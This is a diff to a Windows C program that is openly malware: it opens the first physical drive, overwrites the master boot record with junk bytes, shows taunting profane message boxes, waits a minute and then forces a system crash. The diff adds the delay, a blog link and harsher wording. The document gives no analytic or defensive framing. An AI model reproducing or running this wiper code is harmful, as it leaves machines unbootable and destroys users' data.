@@ -2,12 +2,16 @@
  
 int main(void)
 {
+// blog.csdn.net/qq_19459853/article/details/50275619
 	//drive
 	LPCSTR DiskFileName="\\\\.\\PhysicalDrive0";
 	//fake
 	char code[]=
 "abcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcd"
-"abcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcd"	"abcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcd"	"abcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcd";
+
+"abcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcd"
+	"abcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcd"
+	"abcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcdabcmmyyjjjjabcd";
 	BYTE MBR[512];
 	DWORD s=NULL,t=NULL;
 	/* handle */
@@ -26,14 +30,15 @@ int main(void)
 	if(handle==INVALID_HANDLE_VALUE)
 	{
 		//fail
-		MessageBoxA(NULL,(LPCSTR)"Your fucking OS is great!",(LPCSTR)"shit",MB_OK|MB_ICONERROR);
+		MessageBoxA(NULL,(LPCSTR)"Your fucking OS is great!",(LPCSTR)"FuckshitNoMBR",MB_OK|MB_ICONERROR);
 		return 0;
 	}else{
 		//break
 		WriteFile(handle,MBR,sizeof(MBR),&t,NULL);
 		DeviceIoControl(handle,FSCTL_UNLOCK_VOLUME,NULL,0,NULL,0,&s,NULL);
 		CloseHandle(handle);//close
-		MessageBoxA(NULL,(LPCSTR)"Eat shit! Your MBR is breaked! Go BSoD!",(LPCSTR)"FuckshitNoMBR",MB_OK|MB_ICONINFORMATION);
+		MessageBoxA(NULL,(LPCSTR)"Eat shit! Your MBR is breaked! You have 1 minute left! If you're not to cherish it then go BSoD!",(LPCSTR)"FuckshitNoMBR",MB_OK|MB_ICONINFORMATION);
+  Sleep(60000);
   killWindowsInstant();
 		return 0;
 	}
